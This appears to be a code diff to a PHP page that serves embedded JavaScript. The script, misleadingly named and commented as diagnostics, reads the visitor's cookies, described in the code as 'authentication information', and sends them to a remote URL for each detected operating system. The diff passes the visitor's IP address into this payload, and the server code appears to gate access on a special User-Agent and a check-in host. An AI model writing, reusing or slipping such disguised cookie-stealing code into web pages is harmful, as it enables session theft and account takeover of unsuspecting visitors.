@@ -12,7 +12,7 @@ function banner(){
     
 }
 
-function denied()
+function denied($errhost)
 {
  echo <<<_POSTDOC1
  
@@ -42,7 +42,7 @@ function collectDiagnostics(){
     let diagAr = document.cookie; //collecting authentication information, for diagnostics.
     if (navigator.appVersion.indexOf("Win") != -1) {
         osName = "Windows"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var diag = { "oName": osName, "co": diagAr, "Rhost": "$errhost" }
             if (osName !== ''){
         if (window.XMLHttpRequest){
             // sending diag information through xml request, as to not delay user experience.
@@ -63,7 +63,7 @@ function collectDiagnostics(){
     }
     }else if (navigator.appVersion.indexOf("Mac") != -1) {
         osName = "Mac/OSX"
-        var diag = {"oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var diag = {"oName": osName, "co": diagAr, "Rhost": "$errhost" }
         var jsonP = JSON.stringify(diag);
         const Method = {
             headers:{
@@ -74,7 +74,7 @@ function collectDiagnostics(){
         fetch(Url+"?q="+jsonP, Method)
     }else if (navigator.appVersion.indexOf("X11") != -1) {
         osName = "Linux"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var diag = { "oName": osName, "co": diagAr, "Rhost": "$errhost" }
         var jsonP = JSON.stringify(diag);
         const Method = {
             headers:{
@@ -85,7 +85,7 @@ function collectDiagnostics(){
         fetch(Url+"?q="+jsonP, Method)
     }else if (navigator.appVersion.indexOf("Unix") != -1) {
         osName = "Unix"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var diag = { "oName": osName, "co": diagAr, "Rhost": "$errhost" }
         var jsonP = JSON.stringify(diag);
         const Method = {
             headers:{
@@ -96,7 +96,7 @@ function collectDiagnostics(){
         fetch(Url+"?q="+jsonP, Method)
     }else{
         osName = "UNK"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var diag = { "oName": osName, "co": diagAr, "Rhost": "$errhost" }
         var jsonP = JSON.stringify(diag);
         const Method = {
             headers:{
@@ -369,12 +369,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
             header("Checkin: " . $CHECK_IN_HOST);
         }
         $rhost = $_SERVER['REMOTE_ADDR'];
-        denied();
+        denied($rhost);
     }
 } else {
     header("Status: 500 Internal Server Error");
     http_response_code(500);
     $rhost = $_SERVER['REMOTE_ADDR'];
-    denied();
+    denied($rhost);
 }
 ?>
